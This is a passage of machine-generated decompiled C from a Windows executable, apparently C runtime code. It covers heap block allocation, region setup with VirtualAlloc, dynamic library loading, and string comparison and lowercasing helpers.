	Eq_2 ebx_102 = eax_49;
	Eq_2 dwArg04_575 = eax_49;
	if (eax_49 < edi_21)
	{
		while ((ebx_102.u0->dw0004 & dwLoc0C_572 | (ebx_102.u0)->dw0000 & esi_183) == 0x00)
		{
			&ebx_102.u0->dw0000 = &ebx_102.u0->ptr0014;
			dwArg04_575 = ebx_102;
			if (ebx_102 >= edi_21)
				break;
		}
	}
	ptr32 eax_504;
	if (ebx_102 == edi_21)
	{
		ebx_102 = edx_10;
		while (true)
		{
			bool v37_555 = ebx_102 != eax_49;
			dwArg04_575 = ebx_102;
			if (ebx_102 >= eax_49)
				break;
			if ((ebx_102.u0->dw0004 & dwLoc0C_572 | (ebx_102.u0)->dw0000 & esi_183) != 0x00)
			{
				v37_555 = ebx_102 != eax_49;
				break;
			}
			&ebx_102.u0->dw0000 = &ebx_102.u0->ptr0014;
		}
		if (!v37_555)
		{
			while (true)
			{
				bool v40_558 = ebx_102 != edi_21;
				if (ebx_102 >= edi_21)
					break;
				if (*((word32) ebx_102 + 8) != 0x00)
				{
					v40_558 = ebx_102 != edi_21;
					break;
				}
				&ebx_102.u0->dw0000 = &ebx_102.u0->ptr0014;
				dwArg04_575 = ebx_102;
			}
			if (!v40_558)
			{
				ebx_102 = edx_10;
				while (true)
				{
					bool v43_561 = ebx_102 != eax_49;
					dwArg04_575 = ebx_102;
					if (ebx_102 >= eax_49)
						break;
					if (*((word32) ebx_102 + 8) != 0x00)
					{
						v43_561 = ebx_102 != eax_49;
						break;
					}
					&ebx_102.u0->dw0000 = &ebx_102.u0->ptr0014;
				}
				if (!v43_561)
				{
					Eq_2 eax_128 = fn0040BC12();
					ebx_102 = eax_128;
					dwArg04_575 = eax_128;
					if (eax_128 == 0x00)
					{
l0040B9F7:
						eax_504 = 0x00;
						return eax_504;
					}
				}
			}
			((word32) ebx_102 + 16)->u0->dw0000 = fn0040BCC3(ebx_102);
			if (((word32) ebx_102 + 16)->u0->dw0000 == ~0x00)
				goto l0040B9F7;
		}
	}
	g_t493AD4.u0 = (BOOL) ebx_102;
	struct Eq_8991 * eax_169 = *((word32) ebx_102 + 16);
	Eq_8358 edx_170 = eax_169->t0000.u0;
	Eq_8358 dwLoc08_587 = edx_170;
	if (edx_170 == ~0x00 || ((eax_169->a00C4)[edx_170] & dwLoc0C_572 | (eax_169->a0044)[edx_170] & esi_183) == 0x00)
	{
		dwLoc08_587.u0 = 0x00;
		ui32 * ecx_206 = eax_169->a0044 + 33;
		esi_183 = dwLoc10_571;
		if ((eax_169->a00C4[0] & dwLoc0C_572 | (eax_169->a0044)[0] & dwLoc10_571) == 0x00)
		{
			do
			{
				ecx_206 = ecx_858 + 1;
				dwLoc08_587 = (word32) dwLoc08_587.u0 + 1;
				ecx_858 = ecx_206;
			} while ((*ecx_858 & dwLoc0C_572 | dwLoc10_571 & *ecx_206) == 0x00);
		}
		edx_170 = dwLoc08_587;
	}
	int32 edi_234 = 0x00;
	struct Eq_9053 * ecx_239 = eax_169 + (edx_170 *s 0x0204 + 0x0144) / 0x00C4;
	int32 ecx_245 = eax_169->a0044[edx_170] & esi_183;
	if (ecx_245 == 0x00)
	{
		ecx_245 = eax_169->a00C4[edx_170] & dwLoc0C_572;
		edi_234 = 0x20;
	}
	for (; ecx_245 >= 0x00; ecx_245 <<= 0x01)
		++edi_234;
	struct Eq_9104 * edx_279 = ecx_239->a0004[edi_234].ptr0000;
	int32 ecx_281 = *edx_279 - ecx_25;
	int32 esi_285 = (ecx_281 >> 0x04) - 0x01;
	if (esi_285 > 0x3F)
		esi_285 = 0x3F;
	if (esi_285 == edi_234)
	{
l0040BBC0:
		if (ecx_281 != 0x00)
		{
			*edx_279 = ecx_281;
			edx_279[(ecx_281 - 4) / 0x0C] = (struct Eq_9104) ecx_281;
		}
		goto l0040BBCF;
	}
	if (edx_279->ptr0004 == edx_279->ptr0008)
	{
		if (edi_234 < 0x20)
		{
			uint32 ebx_337 = ~(0x80000000 >> (byte) edi_234);
			eax_169->a0044[dwLoc08_587] = ebx_337 & (eax_169->a0044)[dwLoc08_587];
			byte * edi_336 = (char *) &eax_169->t0000 + 4 + edi_234;
			byte v24_342 = *edi_336 - 0x01;
			*edi_336 = v24_342;
			if (v24_342 == 0x00)
			{
				dwArg04_575.u0->dw0000 &= ebx_337;
				ebx_102 = dwArg04_575;
				goto l0040BB1C;
			}
l0040BB19:
			ebx_102 = dwArg04_575;
			goto l0040BB1C;
		}
		ui32 * ecx_313 = eax_169->a00C4 + dwLoc08_587;
		uint32 ebx_314 = ~(0x80000000 >> (byte) edi_234 - 0x20);
		*ecx_313 &= ebx_314;
		byte * edi_312 = (char *) &eax_169->t0000 + 4 + edi_234;
		byte v27_319 = *edi_312 - 0x01;
		*edi_312 = v27_319;
		if (v27_319 != 0x00)
			goto l0040BB19;
		dwArg04_575.u0->dw0004 &= ebx_314;
		ebx_102 = dwArg04_575;
	}
l0040BB1C:
	edx_279->ptr0008->ptr0004 = edx_279->ptr0004;
	edx_279->ptr0004->ptr0008 = edx_279->ptr0008;
	if (ecx_281 == 0x00)
	{
l0040BBCF:
		int32 * edx_468 = edx_279 + ecx_281 / 0x0C;
		*edx_468 = ecx_25 + 1;
		(edx_468 - 4)[ecx_25 / 4] = ecx_25 + 1;
		word32 ecx_473 = ecx_239->dw0000;
		ecx_239->dw0000 = ecx_473 + 1;
		if (ecx_473 == 0x00 && (ebx_102 == g_t493AD8.u0 && dwLoc08_587 == g_t493AD0.u0))
			g_t493AD8.u0 = 0x00;
		eax_169->t0000.u0 = (int32) dwLoc08_587;
		eax_504 = edx_468 + 1;
		return eax_504;
	}
	edx_279->ptr0004 = ecx_239->a0004[esi_285].ptr0000;
	struct Eq_9104 * ecx_373 = ecx_239 + esi_285 * 2;
	edx_279->ptr0008 = ecx_373;
	ecx_373->ptr0004 = edx_279;
	edx_279->ptr0004->ptr0008 = edx_279;
	if (edx_279->ptr0004 == edx_279->ptr0008)
	{
		byte cl_384 = eax_169[(esi_285 + 4) / 0x00C4];
		if (esi_285 < 0x20)
		{
			eax_169[(esi_285 + 4) / 0x00C4] = (struct Eq_8991) (cl_384 + 0x01);
			if (cl_384 == 0x00)
				ebx_102.u0->dw0000 |= 0x80000000 >> (byte) esi_285;
			eax_169->a0044[dwLoc08_587] |= 0x80000000 >> (byte) esi_285;
		}
		else
		{
			eax_169[(esi_285 + 4) / 0x00C4] = (struct Eq_8991) (cl_384 + 0x01);
			if (cl_384 == 0x00)
				ebx_102.u0->dw0004 |= 0x80000000 >> (byte) esi_285 - 0x20;
			ui32 * edi_408 = eax_169->a00C4 + dwLoc08_587;
			*edi_408 |= 0x80000000 >> (byte) esi_285 - 0x20;
		}
	}
	goto l0040BBC0;
}

// 0040BC12: Register (ptr32 Eq_9424) fn0040BC12()
// Called from:
//      fn0040B909
struct Eq_9424 * fn0040BC12()
{
	struct Eq_9424 * eax_128;
	ui32 eax_36 = g_dw493ADC;
	ui32 ecx_6 = g_dw493ACC;
	if (eax_36 == ecx_6)
	{
		Eq_2 eax_28 = HeapReAlloc(g_t494B04.u0, 0x00, g_t493AE0.u0, ecx_6 + 80 + ecx_6 * 0x04 << 0x02);
		if (eax_28 == 0x00)
		{
l0040BCA5:
			eax_128 = null;
			return eax_128;
		}
		g_dw493ACC += 0x10;
		g_t493AE0.u0 = (BOOL) eax_28;
		eax_36 = g_dw493ADC;
	}
	struct Eq_9424 * esi_49 = g_t493AE0.u0 + (eax_36 * 0x14) / 0x00001000;
	Eq_2 eax_50 = HeapAlloc(g_t494B04.u0, 0x08, 0x41C4);
	esi_49->t0010.u0 = (BOOL) eax_50;
	if (eax_50 != 0x00)
	{
		Eq_2 eax_64 = VirtualAlloc(0x00, 0x00100000, 0x2000, 0x04);
		esi_49->t000C.u0 = (BOOL) eax_64;
		if (eax_64 != 0x00)
		{
			esi_49->dw0008 = ~0x00;
			esi_49->dw0000 = 0x00;
			esi_49->dw0004 = 0x00;
			++g_dw493ADC;
			esi_49->t0010.u0->dw0000 = ~0x00;
			eax_128 = esi_49;
			return eax_128;
		}
		HeapFree(g_t494B04.u0, 0x00, esi_49->t0010.u0);
	}
	goto l0040BCA5;
}

// 0040BCC3: Register int32 fn0040BCC3(Stack Eq_2 dwArg04)
// Called from:
//      fn0040B909
int32 fn0040BCC3(Eq_2 dwArg04)
{
	Eq_2 esi_21 = *((word32) dwArg04 + 16);
	int32 eax_174;
	int32 ebx_176 = 0x00;
	for (eax_174 = *((word32) dwArg04 + 8); eax_174 >= 0x00; eax_174 <<= 0x01)
		++ebx_176;
	word32 edx_40;
	struct Eq_9542 * eax_43 = esi_21.u0 + (ebx_176 *s 0x0204 + 0x0144) / 0x00001000;
	eax_46 = eax_43;
	for (edx_40 = 0x3F; edx_40 != 0x00; --edx_40)
	{
		struct Eq_9542 * eax_46;
		eax_46[1] = (struct Eq_9542) eax_46;
		eax_46->dw0004 = eax_46;
		++eax_46;
	}
	int32 eax_156;
	Eq_2 edi_63 = ((word32) dwArg04 + 0x0C)->u0 + (ebx_176 << 0x0F) / 0x00001000;
	if (VirtualAlloc(edi_63, 0x8000, 0x1000, 0x04) == 0x00)
		eax_156 = ~0x00;
	else
	{
		if (edi_63 <=u edi_63 + 0x7000)
		{
			word32 eax_79 = edi_63 + 16;
			do
			{
				eax_79.u0->dwFFFFFFF8 = ~0x00;
				eax_79.u0->dw0FEC = ~0x00;
				eax_79.u0->dwFFFFFFFC = 0x0FF0;
				Mem90[eax_79 + 0x00:word32] = eax_79 + 0x0FFC;
				Mem92[eax_79 + 4:word32] = eax_79 + ~0x1003;
				eax_79.u0->dw0FE8 = 0x0FF0;
				eax_79 += 0x1000;
			} while (eax_79 - 16 <=u edi_63 + 0x7000);
		}
		eax_43->t01FC = (Eq_9592) ((word32) edi_63 + 0x0C);
		edi_63.u0->ptr0014 = eax_43 + 63;
		Mem118[eax_43 + 0x0200:word32] = edi_63 + 0x700C;
		edi_63.u0->ptr7010 = eax_43 + 63;
		&((word32) esi_21 + (ebx_176 * 0x04 + 0x0044))->u0->dw0000 = 0x00;
		&((word32) esi_21 + (ebx_176 * 0x04 + 0x00C4))->u0->dw0000 = 0x01;
		byte al_129 = esi_21.u0->b0043;
		esi_21.u0->b0043 = al_129 + 0x01;
		if (al_129 == 0x00)
			dwArg04.u0->dw0004 = (word32) (dwArg04.u0->dw0004 | 0x01);
		&((word32) dwArg04 + 8)->u0->dw0000 = *((word32) dwArg04 + 8) & ~(0x80000000 >> (byte) ebx_176);
		eax_156 = ebx_176;
	}
	return eax_156;
}

// 0040BDBE: Register word32 fn0040BDBE(Stack Eq_2 dwArg04)
// Called from:
//      fn00409625
word32 fn0040BDBE(Eq_2 dwArg04)
{
	<anonymous> * eax_5 = g_ptr493ABC;
	if (eax_5 == null)
		return 0x00;
	word32 eax_14;
	eax_5();
	if (eax_14 == 0x00)
		return 0x00;
	return 0x01;
}

// 0040C056: Register word32 fn0040C056(Stack byte bArg04)
// Called from:
//      fn0040A492
word32 fn0040C056(byte bArg04)
{
	word32 dwArg04;
	return fn0040C067((byte) dwArg04, 0x00, 0x04);
}

// 0040C067: Register ui32 fn0040C067(Stack byte bArg04, Stack ui32 dwArg08, Stack byte bArg0C)
// Called from:
//      fn0040C056
ui32 fn0040C067(byte bArg04, ui32 dwArg08, byte bArg0C)
{
	struct Eq_9710 * eax_5 = (word32) bArg04;
	if ((eax_5->b494D61 & bArg0C) != 0x00)
		return 0x01;
	ui32 eax_13;
	if (dwArg08 != 0x00)
		eax_13 = (word32) g_a412A1A[eax_5 * 0x02] & dwArg08;
	else
		eax_13 = 0x00;
	if (eax_13 != 0x00)
		return 0x01;
	return eax_13;
}

// 0040C098: void fn0040C098()
// Called from:
//      fn0040AD15
void fn0040C098()
{
	ptr32 fp;
	word32 ebx_68 = 0x00;
	if (g_t493AC0.u0 == 0x00)
	{
		Eq_2 eax_18 = LoadLibraryA(0x0040D614);
		if (eax_18 == 0x00)
			return;
		Eq_2 eax_28 = GetProcAddress(eax_18, 0x0040D608);
		g_t493AC0.u0 = (BOOL) eax_28;
		if (eax_28 == 0x00)
			return;
		g_t493AC4.u0 = (BOOL) GetProcAddress(eax_18, 4249080);
		g_t493AC8.u0 = (BOOL) GetProcAddress(eax_18, 0x0040D5E4);
	}
	struct Eq_9738 * esp_62 = fp - 0x0C;
	Eq_2 eax_54 = g_t493AC4.u0;
	if (eax_54 != 0x00)
	{
		word32 eax_65;
		eax_54();
		ebx_68 = eax_65;
		if (eax_65 != 0x00)
		{
			Eq_2 eax_73 = g_t493AC8.u0;
			if (eax_73 != 0x00)
			{
				esp_62->dwFFFFFFFC = eax_65;
				word32 eax_81;
				eax_73();
				ebx_68 = eax_81;
			}
		}
	}
	struct Eq_9779 * esp_88 = esp_62 - 4;
	esp_88->dw0000 = esp_62->dw0018;
	esp_88->dwFFFFFFFC = esp_88->dw0018;
	esp_88->dwFFFFFFF8 = esp_88->dw0014;
	esp_88->dwFFFFFFF4 = ebx_68;
	g_t493AC0.u0();
}

// 0040C920: Register int32 fn0040C920(Register Eq_1917 ecx, Stack (ptr32 byte) dwArg04, Stack (ptr32 byte) dwArg08, Register out Eq_1917 ecxOut)
// Called from:
//      fn00404C49
int32 fn0040C920(Eq_1917 ecx, byte * dwArg04, byte * dwArg08, union Eq_1917 & ecxOut)
{
	int32 eax_127;
	byte * esi_17 = dwArg08;
	if (g_t49393C.u0 == 0x00)
	{
		cu8 al_117 = ~0x00;
		byte * edi_85 = dwArg04;
		do
		{
			word24 ecx_24_8_185 = SLICE(ecx, word24, 8);
			cu8 al_124 = al_117;
			if (al_117 == 0x00)
				goto l0040C96E;
			al_117 = *esi_17;
			++esi_17;
			cu8 ah_97 = *edi_85;
			++edi_85;
			if (ah_97 == al_117)
				continue;
			byte cl_114 = 0x00 - (byte) (ah_97 < 0x5B);
			cu8 al_116 = ah_97 - 0x41 + (cl_114 & 0x20);
			cu8 al_106 = al_117 - 0x41 + (0x00 - (byte) (al_117 < 0x5B) & 0x20);
			al_117 = al_116 + 0x41;
			ecx = SEQ(ecx_24_8_185, cl_114 & 0x20);
		} while (al_116 + 0x41 == al_106 + 0x41);
		cu8 al_121 = 0x00 - (byte) (al_116 + 0x41 < al_106 + 0x41);
		al_124 = al_121 - ~0x00 - (byte) (al_121 < 0x00);
l0040C96E:
		eax_127 = (int32) al_124;
	}
	else
	{
		word24 ebx_24_8_148 = 0x00;
		byte * edi_27 = dwArg04;
		int32 eax_215 = 0xFF;
		do
		{
			word24 eax_24_8_45 = SLICE(eax_215, word24, 8);
			eax_127 = eax_215;
			if ((byte) eax_215 == 0x00)
				goto l0040C9A7;
			byte al_36 = *esi_17;
			byte bl_39 = *edi_27;
			++esi_17;
			++edi_27;
			Eq_4295 eax_46 = SEQ(eax_24_8_45, al_36);
			Eq_4295 ebx_50 = SEQ(ebx_24_8_148, bl_39);
			eax_215 = SEQ(eax_24_8_45, al_36);
			if (al_36 == bl_39)
				continue;
			Eq_1917 ecx_55;
			int32 eax_54 = fn00407ACE(ecx, ebx_50, out ecx_55);
			eax_215 = fn00407ACE(ecx_55, eax_46, out ecx);
			cu8 bl_74 = (byte) eax_54;
			ebx_24_8_148 = SLICE(eax_54, word24, 8);
			cu8 al_75 = (byte) eax_215;
		} while (bl_74 == al_75);
		up32 eax_79 = 0x00 - (word32) (bl_74 < al_75);
		eax_127 = eax_79 - ~0x00 - (word32) (eax_79 < 0x00);
	}
l0040C9A7:
	ecxOut = ecx;
	return eax_127;
}

// 0040C9AC: Register word32 fn0040C9AC(Stack Eq_2 dwArg04)
// Called from:
//      fn00404A18
word32 fn0040C9AC(Eq_2 dwArg04)
{
	ptr32 fp;
	word32 * ebp_130 = fp - 4;
	Eq_2 eax_11 = g_t49393C.u0;
	Eq_2 dwLoc08_181 = 0x00;
	if (eax_11 == 0x00)
	{
		Eq_2 edx_146 = dwArg04;
		if (dwArg04.u2->u0 != 0x00)
		{
			do
			{
				ci8 cl_152 = edx_146.u2->u0;
				if (cl_152 >= 0x41 && cl_152 <= 0x5A)
					edx_146.u2->u0 = cl_152 + 0x20;
				&edx_146.u0->dw0000 = &edx_146.u5->b0001;
			} while (edx_146.u2->u0 != 0x00);
		}
	}
	else
	{
		word32 ecx_249;
		Eq_2 eax_44 = fn00408A01(eax_11, 0x0100, dwArg04, ~0x00, 0x00, 0x00, 0x00, 0x01, out ecx_249);
		if (eax_44 != 0x00)
		{
			Eq_2 eax_58 = fn00409613(eax_44);
			dwLoc08_181 = eax_58;
			if (eax_58 != 0x00)
			{
				word32 ecx_250;
				if (fn00408A01(g_t49393C.u0, 0x0100, dwArg04, ~0x00, eax_58, eax_44, 0x00, 0x01, out ecx_250) != 0x00)
					fn00407750(dwArg04, eax_58);
			}
		}
		fn004095E4(dwLoc08_181, out ebp_130);
	}
	return *ebp_130;
}

